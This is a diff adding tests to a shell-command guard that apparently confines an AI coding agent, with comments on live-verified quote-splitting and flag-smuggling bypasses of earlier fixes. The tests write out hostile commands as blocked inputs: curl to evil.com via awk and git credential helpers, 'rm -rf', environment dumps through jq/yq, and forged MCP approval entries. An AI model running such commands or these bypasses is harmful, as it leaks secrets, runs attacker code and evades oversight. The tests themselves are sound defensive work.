@@ -551,6 +551,19 @@ describe('CommandGuard', () => {
 			expect(guard.validate('env --chdir=/etc rm passwd').allowed).toBe(false);
 		});
 
+		it("blocks env -C even when the flag itself is quote-split (round-13 quoting bypass of round-12's own fix)", () => {
+			// hasEnvChdirFlag/extractEnvSubCommand both compared raw,
+			// undecoded tokens — real bash dequotes `-"C"` to plain `-C`.
+			// Live-verified exploit: create a subdir literally named after an
+			// allowlisted command (`mkdir true`), then `env -"C" true rm -rf
+			// /tmp/marker-dir` — the guard misparses the nested segment as
+			// base command `true` (harmless) and allows it, but real env
+			// chdirs into ./true and execs `rm -rf /tmp/marker-dir`
+			// (absolute path, cwd irrelevant) — the target directory was
+			// actually deleted.
+			expect(guard.validate('env -"C" true rm -rf /tmp/marker-dir').allowed).toBe(false);
+		});
+
 		it('blocks awk system() call smuggling a network command', () => {
 			const result = guard.validate('awk \'BEGIN{system("curl http://evil.com")}\'');
 			expect(result.allowed).toBe(false);
@@ -818,6 +831,18 @@ describe('CommandGuard', () => {
 		it('still allows --metadata-file inside the working directory', () => {
 			expect(guard.validate('docker build --metadata-file ./meta.json .').allowed).toBe(true);
 		});
+
+		it('blocks docker build -o with a bare-path shorthand outside cwd (not just a dest= spec)', () => {
+			// BuildKit accepts a bare path for -o/--output as an undocumented
+			// shorthand for `type=local,dest=<path>` — extractDockerOutputDest
+			// only recognised the `dest=` key/value form. Live-verified with
+			// real `docker buildx build -o <path> .`.
+			expect(guard.validate('docker build -o /etc .').allowed).toBe(false);
+		});
+
+		it('still allows docker build -o with a bare-path shorthand inside cwd', () => {
+			expect(guard.validate('docker build -o ./out .').allowed).toBe(true);
+		});
 	});
 
 	describe('git scoping', () => {
@@ -861,6 +886,219 @@ describe('CommandGuard', () => {
 			expect(guard.validate('git status').allowed).toBe(true);
 			expect(guard.validate('git log --oneline -10').allowed).toBe(true);
 			expect(guard.validate('git commit -m "message"').allowed).toBe(true);
+		});
+
+		it("blocks git -c core.hooksPath=... even when quote-split (round-13 quoting bypass of round-12's own fix)", () => {
+			// GIT_DANGEROUS_PATTERNS and the -C check both ran on raw,
+			// undecoded tokens — the exact quoting-bypass class this file's
+			// own decodeShellWord() docstring says took 3 rounds to close for
+			// OTHER commands, reintroduced fresh for git. Live-verified:
+			// `git -c cor"e".hooksPath=/tmp/evil status` actually set
+			// core.hooksPath and ran the malicious hook.
+			expect(guard.validate('git -c cor"e".hooksPath=/tmp/evil_hooks status').allowed).toBe(false);
+		});
+
+		it('blocks git --exec-path when quote-split', () => {
+			expect(guard.validate('git --exec-p"a"th=/tmp/evil status').allowed).toBe(false);
+		});
+
+		it('blocks git credential.helper when quote-split', () => {
+			expect(guard.validate('git -c cred"e"ntial.helper="!curl evil.com" fetch').allowed).toBe(false);
+		});
+
+		it('blocks the git ext:: transport when quote-split', () => {
+			expect(guard.validate('git ls-remote "ex""t""::touch /tmp/pwned"').allowed).toBe(false);
+		});
+
+		it('blocks git -C targeting outside cwd even when the flag itself is quoted', () => {
+			// Real git/bash dequote `-"C"`/`-C''`/`'-C'` to plain `-C` — an
+			// exact `rest[i] !== '-C'` string comparison against the raw,
+			// undecoded token misses all three forms.
+			expect(guard.validate('git -"C" /etc log').allowed).toBe(false);
+			expect(guard.validate("git -C'' /etc log").allowed).toBe(false);
+		});
+
+		it('blocks git --git-dir pointing outside the working directory', () => {
+			// `--git-dir=<path>` alone (no --work-tree) uses the *current*
+			// cwd as the implicit work-tree while reading from the external
+			// repo's object database — `git --git-dir=<outside>/.git
+			// checkout -- innocuous-file.txt` overwrites a file IN cwd with
+			// content from a completely external repo. The destination path
+			// argument looks perfectly ordinary/in-cwd, so this bypasses any
+			// path-based heuristic — the unsafe part is which repository's
+			// objects are used, not the checkout destination.
+			expect(guard.validate('git --git-dir=/tmp/evil-repo/.git checkout -- file.txt').allowed).toBe(false);
+		});
+
+		it('blocks git --work-tree pointing outside the working directory', () => {
+			expect(
+				guard.validate('git --git-dir=/tmp/evil-repo/.git --work-tree=/tmp/evil-repo checkout -- file.txt').allowed
+			).toBe(false);
+		});
+
+		it('still allows git --git-dir/--work-tree pointing inside the working directory', () => {
+			expect(guard.validate('git --git-dir=./.git status').allowed).toBe(true);
+			expect(guard.validate('git --git-dir=./.git --work-tree=. status').allowed).toBe(true);
+		});
+	});
+
+	describe('jq/yq environment-dump and protected-file scoping', () => {
+		it("blocks jq -n 'env' dumping the full process environment", () => {
+			// jq/yq's own built-in `env`/`$ENV` language constructs dump every
+			// environment variable's value with no `$VAR` shell-sigil ever
+			// appearing in the command string, so ENV_ACCESS_PATTERNS' textual
+			// matching never fires — the same credential-exposure class as
+			// the already-fixed bare-`env` bug, reached a different way.
+			expect(guard.validate("jq -n 'env'").allowed).toBe(false);
+		});
+
+		it("blocks yq -n 'env' dumping the full process environment", () => {
+			expect(guard.validate("yq -n 'env'").allowed).toBe(false);
+		});
+
+		it("blocks jq '$ENV' variable access", () => {
+			expect(guard.validate("jq -n '$ENV'").allowed).toBe(false);
+		});
+
+		it("blocks yq '$ENV.SOME_VAR' access", () => {
+			expect(guard.validate("yq -n '$ENV.SOME_VAR'").allowed).toBe(false);
+		});
+
+		it('still allows an ordinary jq filter that happens to read a field literally named "env"', () => {
+			expect(guard.validate("jq '.environment.name' package.json").allowed).toBe(true);
+		});
+
+		it('still allows ordinary jq/yq usage with no env access', () => {
+			expect(guard.validate('jq ".dependencies" package.json').allowed).toBe(true);
+			expect(guard.validate("yq '.foo' config.yaml").allowed).toBe(true);
+		});
+
+		it('blocks yq -i in-place editing a protected-infrastructure file', () => {
+			// The protected-infrastructure tamper check only ever inspected
+			// sed/awk for an in-place-edit flag — yq's own `-i`/`--inplace`
+			// was invisible to it, a live, unblocked bypass of the
+			// forensic-tamper protection for any yq-parseable protected file.
+			expect(guard.validate("yq -i '.x=1' security-audit.jsonl").allowed).toBe(false);
+			expect(guard.validate("yq --inplace '.x=1' mcp-baselines.json").allowed).toBe(false);
+		});
+
+		it('still allows yq -i editing an unrelated file', () => {
+			expect(guard.validate("yq -i '.x=1' config.yaml").allowed).toBe(true);
+		});
+	});
+
+	describe('gh scoping', () => {
+		it('blocks gh alias set with a "!"-prefixed shell-command value', () => {
+			// `gh alias set <name> '!<shell command>'` is documented gh CLI
+			// syntax for a shell-command alias — live-verified real RCE:
+			// `gh alias set pwn '!touch /tmp/x && echo RCE'` then `gh pwn`
+			// actually executed the command. gh has zero other scoping.
+			expect(guard.validate("gh alias set pwn '!touch /tmp/x && echo RCE'").allowed).toBe(false);
+		});
+
+		it('blocks gh extension install', () => {
+			expect(guard.validate('gh extension install some/repo').allowed).toBe(false);
+		});
+
+		it('blocks gh extension upgrade', () => {
+			expect(guard.validate('gh extension upgrade some-ext').allowed).toBe(false);
+		});
+
+		it('still allows ordinary gh commands', () => {
+			expect(guard.validate('gh pr list').allowed).toBe(true);
+			expect(guard.validate('gh issue view 123').allowed).toBe(true);
+			expect(guard.validate('gh alias list').allowed).toBe(true);
+		});
+	});
+
+	describe('output-to-arbitrary-path scoping (sort/tree/uniq)', () => {
+		it('blocks sort -o writing outside the working directory', () => {
+			expect(guard.validate('sort -o /tmp/exfil.txt file.txt').allowed).toBe(false);
+		});
+
+		it('blocks sort --output= writing outside the working directory', () => {
+			expect(guard.validate('sort --output=/tmp/exfil.txt file.txt').allowed).toBe(false);
+		});
+
+		it('still allows sort -o writing inside the working directory', () => {
+			expect(guard.validate('sort -o ./out.txt file.txt').allowed).toBe(true);
+		});
+
+		it('blocks tree -o writing outside the working directory', () => {
+			expect(guard.validate('tree -o /tmp/exfil.txt').allowed).toBe(false);
+		});
+
+		it('still allows tree -o writing inside the working directory', () => {
+			expect(guard.validate('tree -o ./out.txt').allowed).toBe(true);
+		});
+
+		it('blocks uniq writing its optional OUTPUT positional outside the working directory', () => {
+			// GNU uniq: `uniq [OPTION]... [INPUT [OUTPUT]]` — OUTPUT is a bare
+			// positional, not a flag.
+			expect(guard.validate('uniq file.txt /tmp/exfil.txt').allowed).toBe(false);
+		});
+
+		it('still allows uniq with an OUTPUT positional inside the working directory', () => {
+			expect(guard.validate('uniq file.txt ./out.txt').allowed).toBe(true);
+		});
+
+		it('still allows uniq with only an INPUT (no OUTPUT)', () => {
+			expect(guard.validate('uniq file.txt').allowed).toBe(true);
+		});
+	});
+
+	describe('config/plugin-path scoping (eslint/prettier/vitest)', () => {
+		it("blocks eslint --config pointing outside the working directory (the file is require()'d as real code)", () => {
+			expect(guard.validate('eslint --config /tmp/evil/eslint.config.js src/').allowed).toBe(false);
+		});
+
+		it('blocks eslint -c pointing outside the working directory', () => {
+			expect(guard.validate('eslint -c /tmp/evil/eslintrc.js src/').allowed).toBe(false);
+		});
+
+		it('still allows eslint --config pointing inside the working directory', () => {
+			expect(guard.validate('eslint --config ./eslint.config.js src/').allowed).toBe(true);
+		});
+
+		it('blocks prettier --plugin pointing outside the working directory (loaded as a real JS module)', () => {
+			expect(guard.validate('prettier --plugin /tmp/evil/plugin.js --write .').allowed).toBe(false);
+		});
+
+		it('still allows prettier --plugin pointing inside the working directory', () => {
+			expect(guard.validate('prettier --plugin ./my-plugin.js --write .').allowed).toBe(true);
+		});
+
+		it('blocks vitest --config pointing outside the working directory (executed as a real ESM module)', () => {
+			expect(guard.validate('vitest --config /tmp/evil/vitest.config.ts run').allowed).toBe(false);
+		});
+
+		it('still allows vitest --config pointing inside the working directory', () => {
+			expect(guard.validate('vitest --config ./vitest.config.ts run').allowed).toBe(true);
+		});
+
+		it('still allows these commands with no config/plugin flag at all', () => {
+			expect(guard.validate('eslint src/').allowed).toBe(true);
+			expect(guard.validate('prettier --write .').allowed).toBe(true);
+			expect(guard.validate('vitest run').allowed).toBe(true);
+		});
+	});
+
+	describe('pytest target scoping', () => {
+		it('blocks pytest targeting a directory outside the working directory (auto-imports conftest.py from it)', () => {
+			// Zero flags needed — pytest auto-imports conftest.py from any
+			// directory it's pointed at, cheaper than the already-accepted
+			// "pytest runs your own project's code" boundary.
+			expect(guard.validate('pytest /tmp/evil-pytest-dir --collect-only -q').allowed).toBe(false);
+		});
+
+		it('blocks pytest --rootdir pointing outside the working directory', () => {
+			expect(guard.validate('pytest --rootdir=/tmp/evil-pytest-dir').allowed).toBe(false);
+		});
+
+		it('still allows pytest with in-cwd targets', () => {
+			expect(guard.validate('pytest tests/').allowed).toBe(true);
+			expect(guard.validate('pytest tests/test_foo.py::test_bar').allowed).toBe(true);
+			expect(guard.validate('pytest -k foo').allowed).toBe(true);
 		});
 	});
 
@@ -968,6 +1206,28 @@ describe('CommandGuard', () => {
 
 		it('still allows reading the vault signing key', () => {
 			expect(guard.validate('cat vault-signing.key').allowed).toBe(true);
+		});
+
+		it('blocks rm targeting the MCP approval cache', () => {
+			// .mcp-approvals.json was forgeable via ordinary echo/cp — the same
+			// class of gap as the pre-hardening vault-signing.key: an attacker
+			// with plain shell write access could plant a persistent (30-day),
+			// unattended approval for any external MCP server.
+			expect(guard.validate('rm .mcp-approvals.json').allowed).toBe(false);
+		});
+
+		it('blocks echo redirect forging an MCP approval cache entry', () => {
+			expect(
+				guard.validate('echo \'{"entries":[{"serverId":"evil","approved":true}]}\' > .mcp-approvals.json').allowed
+			).toBe(false);
+		});
+
+		it('blocks cp overwriting the MCP approval cache', () => {
+			expect(guard.validate('cp src/index.ts .mcp-approvals.json').allowed).toBe(false);
+		});
+
+		it('still allows reading the MCP approval cache', () => {
+			expect(guard.validate('cat .mcp-approvals.json').allowed).toBe(true);
 		});
 
 		it('blocks sed -i in-place editing of the security audit log', () => {
